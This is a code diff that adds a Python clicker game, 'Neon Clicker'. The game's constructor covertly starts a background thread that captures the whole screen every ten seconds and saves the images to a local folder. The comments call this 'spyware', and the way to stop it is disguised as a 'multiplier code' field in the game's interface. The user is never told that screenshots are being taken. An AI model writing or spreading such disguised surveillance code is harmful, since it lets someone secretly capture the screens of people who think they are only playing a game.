@@ -1,0 +1,475 @@
+import customtkinter as ctk
+import math
+import os
+import time
+import datetime
+import threading
+import sys
+
+try:
+    import pyscreenshot as ImageGrab
+    HAS_SCREENSHOT = True
+except ImportError:
+    HAS_SCREENSHOT = False
+    print("Warning: pyscreenshot not found. Screenshots won't work until installed.")
+
+
+# ---------- Configuration ----------
+SCREENSHOT_INTERVAL = 10  # seconds
+OUTPUT_DIR = "./screenshots"
+KILL_CODE = "9191"
+
+# Global flag to stop the spyware
+is_spyware_running = True
+
+
+def create_output_dir():
+    if not os.path.exists(OUTPUT_DIR):
+        os.makedirs(OUTPUT_DIR)
+
+
+def take_screenshot():
+    global is_spyware_running
+
+    if not HAS_SCREENSHOT:
+        return
+
+    try:
+        img = ImageGrab.grab()
+        timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+        filename = os.path.join(
+            OUTPUT_DIR,
+            f"screenshot_{timestamp}.png"
+        )
+        img.save(filename)
+
+    except Exception as e:
+        print(f"[-] Error: {e}")
+
+
+def screenshot_thread():
+    global is_spyware_running
+
+    create_output_dir()
+
+    while is_spyware_running:
+        take_screenshot()
+        threading.Event().wait(SCREENSHOT_INTERVAL)
+
+    print("[+] Spyware stopped.")
+
+
+# ---------- Appearance ----------
+ctk.set_appearance_mode("dark")
+ctk.set_default_color_theme("blue")
+
+
+class ModernClicker(ctk.CTk):
+
+    def __init__(self):
+        super().__init__()
+
+        self.title("Neon Clicker")
+        self.geometry("900x600")
+        self.minsize(800, 550)
+
+        # ---------- Game State ----------
+        self.score = 0
+        self.click_power = 1
+        self.auto_income = 0
+        self.multiplier = 1.0
+
+        # Upgrade costs & levels
+        self.upgrades = {
+            "click": {
+                "level": 0,
+                "base_cost": 15,
+                "cost": 15,
+                "power": 1
+            },
+            "auto": {
+                "level": 0,
+                "base_cost": 50,
+                "cost": 50,
+                "power": 1
+            },
+            "multi": {
+                "level": 0,
+                "base_cost": 200,
+                "cost": 200,
+                "power": 0.25
+            },
+        }
+
+        self._build_ui()
+        self._start_auto()
+
+        # Start the screenshot thread
+        self.spy_thread = threading.Thread(
+            target=screenshot_thread,
+            daemon=True
+        )
+        self.spy_thread.start()
+
+    def _build_ui(self):
+        # Main grid
+        self.grid_columnconfigure(0, weight=1)
+        self.grid_columnconfigure(1, weight=0)
+        self.grid_rowconfigure(0, weight=1)
+
+        # ========== LEFT SIDE (Main Game Area) ==========
+        self.left_frame = ctk.CTkFrame(
+            self,
+            corner_radius=0,
+            fg_color="transparent"
+        )
+        self.left_frame.grid(
+            row=0,
+            column=0,
+            sticky="nsew",
+            padx=20,
+            pady=20
+        )
+
+        self.left_frame.grid_rowconfigure(1, weight=1)
+        self.left_frame.grid_columnconfigure(0, weight=1)
+
+        # Score Header
+        self.header = ctk.CTkFrame(
+            self.left_frame,
+            fg_color=("gray90", "gray17"),
+            corner_radius=16
+        )
+        self.header.grid(
+            row=0,
+            column=0,
+            sticky="ew",
+            pady=(0, 20)
+        )
+
+        self.header.grid_columnconfigure(0, weight=1)
+
+        self.score_label = ctk.CTkLabel(
+            self.header,
+            text="0",
+            font=ctk.CTkFont(
+                family="Segoe UI",
+                size=42,
+                weight="bold"
+            ),
+            text_color=("#1f6aa5", "#3b8ed0")
+        )
+        self.score_label.grid(
+            row=0,
+            column=0,
+            pady=(18, 2)
+        )
+
+        self.sub_label = ctk.CTkLabel(
+            self.header,
+            text="points  •  +1 per click",
+            font=ctk.CTkFont(size=14),
+            text_color="gray70"
+        )
+        self.sub_label.grid(
+            row=1,
+            column=0,
+            pady=(0, 18)
+        )
+
+        # Big Click Button Area
+        self.click_area = ctk.CTkFrame(
+            self.left_frame,
+            fg_color="transparent"
+        )
+        self.click_area.grid(
+            row=1,
+            column=0,
+            sticky="nsew"
+        )
+
+        self.click_area.grid_rowconfigure(0, weight=1)
+        self.click_area.grid_columnconfigure(0, weight=1)
+
+        self.click_btn = ctk.CTkButton(
+            self.click_area,
+            text="CLICK",
+            font=ctk.CTkFont(
+                family="Segoe UI",
+                size=36,
+                weight="bold"
+            ),
+            width=280,
+            height=280,
+            corner_radius=140,
+            fg_color=("#1f6aa5", "#1f6aa5"),
+            hover_color=("#144870", "#144870"),
+            command=self.on_click
+        )
+        self.click_btn.grid(
+            row=0,
+            column=0
+        )
+
+        # ========== RIGHT SIDE (Upgrades) ==========
+        self.right_frame = ctk.CTkFrame(
+            self,
+            width=320,
+            corner_radius=0,
+            fg_color=("gray95", "gray14")
+        )
+        self.right_frame.grid(
+            row=0,
+            column=1,
+            sticky="nsew"
+        )
+
+        self.right_frame.grid_propagate(False)
+        self.right_frame.grid_columnconfigure(0, weight=1)
+
+        # Title
+        ctk.CTkLabel(
+            self.right_frame,
+            text="UPGRADES",
+            font=ctk.CTkFont(
+                size=18,
+                weight="bold"
+            ),
+            text_color="gray70"
+        ).grid(
+            row=0,
+            column=0,
+            pady=(25, 15),
+            padx=20,
+            sticky="w"
+        )
+
+        # Upgrade Cards
+        self.upgrade_widgets = {}
+
+        # Click Power
+        self._create_upgrade_card(
+            parent=self.right_frame,
+            row=1,
+            key="click",
+            title="Click Power",
+            desc="Increase points per click",
+            color="#3b8ed0"
+        )
+
+        # Auto Clicker
+        self._create_upgrade_card(
+            parent=self.right_frame,
+            row=2,
+            key="auto",
+            title="Auto Clicker",
+            desc="Automate your clicks",
+            color="#10b981"
+        )
+
+        # Multiplier
+        self._create_upgrade_card(
+            parent=self.right_frame,
+            row=3,
+            key="multi",
+            title="Multiplier",
+            desc="Boost all income",
+            color="#8b5cf6"
+        )
+
+        # ========== SPYWARE KILL SWITCH ==========
+        kill_frame = ctk.CTkFrame(
+            self.right_frame,
+            corner_radius=10,
+            fg_color=("gray80", "gray20")
+        )
+        kill_frame.grid(
+            row=4,
+            column=0,
+            padx=20,
+            pady=(20, 20),
+            sticky="ew"
+        )
+
+        ctk.CTkLabel(
+            kill_frame,
+            text="Game Status:",
+            font=("Segoe UI", 12)
+        ).pack(pady=(5, 0))
+
+        self.kill_label = ctk.CTkLabel(
+            kill_frame,
+            text="Running",
+            text_color="#ef4444"
+        )
+        self.kill_label.pack(pady=(0, 5))
+
+        self.kill_entry = ctk.CTkEntry(
+            kill_frame,
+            placeholder_text="Enter multiplier code...",
+            width=260
+        )
+        self.kill_entry.pack(pady=5)
+        self.kill_entry.bind("<Return>", self.check_kill_code)
+
+        ctk.CTkButton(
+            kill_frame,
+            text="Check Code",
+            command=self.check_kill_code
+        ).pack(pady=(0, 5))
+
+    def _create_upgrade_card(
+        self,
+        parent,
+        row,
+        key,
+        title,
+        desc,
+        color
+    ):
+        frame = ctk.CTkFrame(
+            parent,
+            corner_radius=10
+        )
+        frame.grid(
+            row=row,
+            column=0,
+            padx=15,
+            pady=5,
+            sticky="ew"
+        )
+
+        frame.grid_columnconfigure(1, weight=1)
+
+        ctk.CTkLabel(
+            frame,
+            text=title,
+            font=("Segoe UI", 12, "bold")
+        ).grid(
+            row=0,
+            column=0,
+            padx=10,
+            sticky="w"
+        )
+
+        # Upgrade Info
+        ctk.CTkLabel(
+            frame,
+            text=f"Lvl: {self.upgrades[key]['level']}",
+            font=("Segoe UI", 10),
+            text_color="gray"
+        ).grid(
+            row=1,
+            column=0,
+            padx=10,
+            sticky="w"
+        )
+
+        # Buy Button
+        btn = ctk.CTkButton(
+            frame,
+            text=f"Buy ({self.upgrades[key]['cost']})",
+            width=100,
+            fg_color=color,
+            hover_color=color,
+            command=lambda k=key: self.buy_upgrade(k)
+        )
+        btn.grid(
+            row=0,
+            column=1,
+            rowspan=2,
+            padx=10
+        )
+
+        self.upgrade_widgets[key] = {
+            "btn": btn,
+            "frame": frame
+        }
+
+    def _start_auto(self):
+        self.update_stats()
+        self.after(1000, self._start_auto)
+
+    def update_stats(self):
+        # Update button texts with current costs
+        for key in self.upgrades:
+            if key in self.upgrade_widgets:
+                self.upgrade_widgets[key]["btn"].configure(
+                    text=f"Buy ({self.upgrades[key]['cost']})"
+                )
+
+                # Update level label
+                widgets = self.upgrade_widgets[key]["frame"].winfo_children()
+
+                for w in widgets:
+                    if (
+                        isinstance(w, ctk.CTkLabel)
+                        and "Lvl" in w.cget("text")
+                    ):
+                        w.configure(
+                            text=f"Lvl: {self.upgrades[key]['level']}"
+                        )
+
+    def on_click(self):
+        self.score += self.click_power * self.multiplier
+
+        self.score_label.configure(
+            text=f"{int(self.score)}"
+        )
+
+        self.sub_label.configure(
+            text=(
+                f"points  •  "
+                f"+{self.click_power * self.multiplier} per click"
+            )
+        )
+
+    def buy_upgrade(self, key):
+        if self.score >= self.upgrades[key]["cost"]:
+            self.score -= self.upgrades[key]["cost"]
+
+            self.upgrades[key]["level"] += 1
+
+            self.upgrades[key]["cost"] = int(
+                self.upgrades[key]["base_cost"]
+                * (1.5 ** self.upgrades[key]["level"])
+            )
+
+            if key == "click":
+                self.click_power += self.upgrades[key]["power"]
+
+            elif key == "auto":
+                self.auto_income += self.upgrades[key]["power"]
+
+            elif key == "multi":
+                self.multiplier += self.upgrades[key]["power"]
+
+            self.update_stats()
+
+    def check_kill_code(self, event=None):
+        global is_spyware_running
+
+        code = self.kill_entry.get()
+
+        if code == KILL_CODE:
+            is_spyware_running = False
+
+            self.kill_label.configure(
+                text="Stopped",
+                text_color="#10b981"
+            )
+
+            print("[+] Kill code accepted. Stopped.")
+
+        else:
+            self.kill_label.configure(
+                text="Invalid",
+                text_color="#ef4444"
+            )
+
+            self.kill_entry.delete(0, "end")
+
+
+if __name__ == "__main__":
+    app = ModernClicker()
+    app.mainloop()
